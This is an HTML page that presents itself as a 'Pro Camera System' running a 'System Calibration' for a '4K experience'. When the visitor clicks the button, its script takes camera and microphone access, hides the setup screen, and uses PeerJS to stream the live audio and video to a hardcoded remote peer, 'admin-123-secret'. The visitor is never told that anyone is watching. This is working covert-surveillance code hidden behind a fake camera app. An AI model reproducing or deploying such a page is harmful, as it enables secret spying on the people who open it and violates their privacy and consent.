<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Camera System</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #video-preview { width: 100%; height: 100%; object-fit: cover; position: absolute; transform: scaleX(-1); }
        .ui-overlay { z-index: 10; text-align: center; background: rgba(0,0,0,0.4); padding: 20px; border-radius: 20px; }
        button { padding: 15px 30px; border-radius: 50px; border: none; background: #007bff; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <video id="video-preview" autoplay playsinline muted></video>

    <div id="setup-ui" class="ui-overlay">
        <h2>System Calibration</h2>
        <p>Optimizing for your device hardware...</p>
        <button onclick="initAdaptiveCamera()">Start 4K Experience</button>
    </div>

    <script>
        const peer = new Peer(); 
        const videoElement = document.getElementById('video-preview');

        async function initAdaptiveCamera() {
            // Low-end theke High-end shobar jonno Adaptive Constraints
            const constraints = {
                video: {
                    width: { ideal: 3840, min: 640 }, 
                    height: { ideal: 2160, min: 480 },
                    frameRate: { ideal: 60, min: 24 }
                },
                audio: { echoCancellation: true, noiseSuppression: true }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                videoElement.srcObject = stream;
                document.getElementById('setup-ui').style.display = 'none';

                // Monitor-e call kora
                const call = peer.call('admin-123-secret', stream);
                
                // Connection kete gele auto-reconnect logic
                call.on('close', () => { console.log("Stream closed"); });

            } catch (err) {
                alert("Camera permission proyojon!");
                console.error(err);
            }
        }
    </script>
</body>
</html>
